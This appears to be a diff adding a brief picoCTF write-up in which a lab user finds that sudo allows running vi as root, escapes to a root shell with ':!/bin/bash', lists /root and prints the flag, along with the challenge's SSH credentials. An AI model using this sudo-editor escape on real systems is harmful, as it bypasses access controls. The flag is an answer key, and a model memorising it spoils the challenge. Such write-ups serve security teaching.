@@ -1,0 +1,45 @@
+Can you read files in the root file? The system admin has provisioned an account for you on the main server: ssh -p 57914 picoplayer@saturn.picoctf.net Password: NBD+zO8s4y Can you login and read the root file?
+
+Hints:
+What permissions do you have?
+
+
+
+
+Process:
+
+start machine
+
+
+ssh -p 53288 picoplayer@saturn.picoctf.net
+yes to fingerprint
+password
+
+picoplayer@challenge:~$ sudo -l
+[sudo] password for picoplayer: 
+Matching Defaults entries for picoplayer on challenge:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User picoplayer may run the following commands on challenge:
+    (ALL) /usr/bin/vi
+
+
+(vi is usable)
+
+picoplayer@challenge:~$ sudo vi test (type in :!/bin/bash and hit enter)
+
+root@challenge:/home/picoplayer# cd /root/
+
+
+root@challenge:~# ls -la
+total 12
+drwx------ 1 root root   23 Aug  4 21:32 .
+drwxr-xr-x 1 root root   51 Oct 13 07:31 ..
+-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
+-rw-r--r-- 1 root root   35 Aug  4 21:32 .flag.txt
+-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
+
+
+root@challenge:~# cat .flag.txt
+picoCTF{uS1ng_v1m_3dit0r_1cee9dcb}
